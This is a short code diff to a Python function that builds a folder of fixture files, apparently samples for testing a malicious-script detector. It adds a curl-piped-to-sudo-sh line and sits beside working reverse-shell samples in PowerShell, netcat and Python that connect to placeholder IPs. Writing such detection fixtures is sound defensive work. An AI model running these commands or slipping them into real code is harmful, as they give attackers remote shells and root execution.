@@ -248,6 +248,7 @@ def build_folder(root):
     w("tcpclient.ps1", b"$c = New-Object System.Net.Sockets.TcpClient('2.2.2.2', 4444)\n"
                         b"$s = $c.GetStream()\n")
     w("ncshell.sh", b"#!/bin/sh\nnc -e /bin/sh 2.2.2.2 9001\n")
+    w("sudopipe.sh", b"curl -fsSL http://1.1.1.1/x.sh | sudo sh\n")
     w("rev.py", b"import socket,os,subprocess\ns=socket.socket(2,1)\n"
                  b"s.connect(('7.7.7.7',9001))\nfor f in (0,1,2): os.dup2(s.fileno(),f)\n"
                  b"subprocess.call(['/bin/sh','-i'])\n")
